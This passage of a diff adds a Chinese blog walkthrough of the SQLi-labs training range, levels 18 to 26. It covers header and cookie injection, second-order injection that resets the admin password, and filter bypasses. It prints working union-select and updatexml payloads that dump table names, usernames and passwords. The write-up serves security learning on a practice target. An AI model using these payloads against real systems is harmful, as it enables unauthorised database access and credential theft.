+	loading="lazy"
+	
+		alt="image-20240524232119939"
+	
+	
+></p>
+<h2 id="less---18">less - 18
+</h2><p>这关也使用报错注入，但是注入点不同，查看源代码</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251512795.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240525151226512"
+	
+	
+></p>
+<p>发现注入点在<code>user-agent</code>字段，这时就需要使用<code>burpsuite</code>工具进行抓包，然后在<code>user-agent</code>请求头进行注入。</p>
+<p>不过这里需要注意两点，首先我们的账号密码需要输入正确，因为根据代码逻辑只有正常登录才会显示<code>user-agent</code>的信息。第二就是需要根据编写好的<code>sql</code>语句进行闭合，才能注入成功。</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251528146.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240525152843627"
+	
+	
+></p>
+<p>之后就可以使用<code>less-17</code>报错注入的方法了</p>
+<h2 id="less---19">less - 19
+</h2><p>这里的注入点变成了<code>referer</code>请求头，写法如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">referer</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="s1">&#39;,2)#
+</span></span></span></code></pre></div><p>方法同<code>less-18</code></p>
+<h2 id="less---20">less - 20
+</h2><p>这关注入点在<code>cookie</code>字段</p>
+<p>这里需要先正常登录，然后进入登录界面</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251536259.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240525153624891"
+	
+	
+></p>
+<p>接着重新刷新该页面，并抓包</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251540578.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240525154005176"
+	
+	
+></p>
+<p>方法同<code>less-17</code></p>
+<h2 id="less---21">less - 21
+</h2><p>源代码中</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE username=(&#39;</span><span class="si">$cookee</span><span class="s2">&#39;) LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span></code></pre></div><p>所以这里闭合符为<code>')</code>,注入点依然是<code>cookie</code>字段，不同点在于这关注入语句需要进行<code>base64编码</code></p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251548942.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240525154825671"
+	
+	
+></p>
+<h2 id="less---22">less - 22
+</h2><p>闭合符为<code>&quot;</code>，方法同<code>less-21</code></p>
+<h2 id="less---23">less - 23
+</h2><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271249369.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240527124928160"
+	
+	
+></p>
+<p>这关中注释符被过滤了。但是并不妨碍我们进行注入，我们使用注释符只是为了在拼接语句时，将后面一些没用的语句去除。现在不允许使用注释符，我们只要按照它的逻辑进行拼接就行。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">在拼接中就会变为</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="s1">&#39;
+</span></span></span></code></pre></div><p>所以可以理解为现在<code>or '1'='1</code>变成了我们的注释符，接着使用联合注入的方法</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39;),3 or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39; and table_name=&#39;</span><span class="n">users</span><span class="s1">&#39; ),3 or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,(select group_concat(password,username) from users),3 or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
+</span></span></span></code></pre></div><h2 id="less---24">less - 24
+</h2><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271309455.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240527130908228"
+	
+	
+></p>
+<p>这关的页面组成就比较复杂了，有注册页面、登录页面、修改密码页面，而这些相应的文件我们都要使用到。</p>
+<p>先来讲讲这关注入的逻辑，以及文件之间的联动。</p>
+<p><code>login_register.php</code></p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271317335.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240527131742154"
+	
+	
+></p>
+<p>这个文件掌管注册功能，可以看见这里对注册的账号密码没有任何管控，也就是说你输入什么信息都可以，那我们这里以<code>username=admin'#    password=123456</code>信息来注册，注册成功。</p>
+<p>接着我们就用这个信息来登录，下面是登录后的界面</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271326457.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240527132652112"
+	
+	
+></p>
+<p><code>pass_change.php</code></p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271328431.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240527132802354"
+	
+	
+></p>
+<p>这个是修改密码的文件，现在我们用现在登录后的信息拼接到更新密码的sql语句中就会变成</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">UPDATE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">PASSWORD</span><span class="o">=</span><span class="s1">&#39;$pass&#39;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="o">#</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;123456&#39;</span><span class="w"> 
+</span></span></span></code></pre></div><p>可以发现我们这里修改的账号就会变成<code>admin</code>,这就是<code>二次注入</code>的原理。原来<code>admin</code>密码是<code>admin</code>，现在我们就可以把它的密码修改为我们知道的密码<code>123456</code></p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271332213.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240527133239037"
+	
+	
+></p>
+<p>可以看到我们成功修改了<code>admin</code>的密码，之后就可以用它的权限登录。</p>
+<h2 id="less---25">less - 25
+</h2><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271344216.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240527134451043"
+	
+	
+></p>
+<p>这关将<code>or</code>和<code>and</code>替换为空并且无论大小写，但是它只替换了一次，所以我们可以双写绕过，如果注入语句中含有<code>or</code>，我们可以将其写为<code>oorr</code>，这样即使替换为空，依然得到<code>or</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">2</span><span class="s1">&#39; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39;--+
+</span></span></span></code></pre></div><h2 id="less---25a">less - 25a
+</h2><p>变成了数字型，方法同上</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">2</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">infoorrmation_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="c1">--+
+</span></span></span></code></pre></div><h2 id="less---26">less - 26
+</h2><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405300042352.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240530004250965"
+	
+	
+></p>
+<p>添加了新的规则，所以现在不能使用逻辑运算符、注释符以及空格符。这次就需要进行绕过。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">绕过空格
+</span></span><span class="line"><span class="cl">%09 tab键 %0a 新建一行 %0c 新的一页 %od return功能 %0b tab键垂直 %a0 空格   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">绕过AND
+</span></span><span class="line"><span class="cl">&amp;&amp;  %26%26
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">绕过or
+</span></span><span class="line"><span class="cl">||  %7C%7C
+</span></span></code></pre></div><p>只要如此绕过，接下来就可以正常注入。不过可能本地建的apache服务没有解析功能，所以还得用<code>()</code>方法绕过。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39;))),1))||&#39;</span><span class="mi">0</span><span class="w">   </span><span class="err">爆表</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39;aandnd(table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;)))),1))||&#39;</span><span class="mi">0</span><span class="w">     </span><span class="err">爆字段</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||&#39;</span><span class="mi">0</span><span class="w">   </span><span class="err">爆密码账户</span><span class="w">
+</span></span></span></code></pre></div><h2 id="总结">总结
+</h2><h3 id="get传参和post传参注释符使用的不同">get传参和post传参注释符使用的不同
+</h3>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/upload-labs%E9%9D%B6%E5%9C%BA/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052319298.jpg" loading="lazy" data-key="" data-hash="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052319298.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Upload Labs靶场</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["/source/Sticker-100/"],"locale":{"admin":"👻屑博主","placeholder":"🎉留下你的脚印."},"requiredMeta":["name","email","url"]});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Winglet
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.eb0e6dd5d2a8cfab5f378dc86e1cc7255319197aef62eea04ee7bad86656cf1f.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
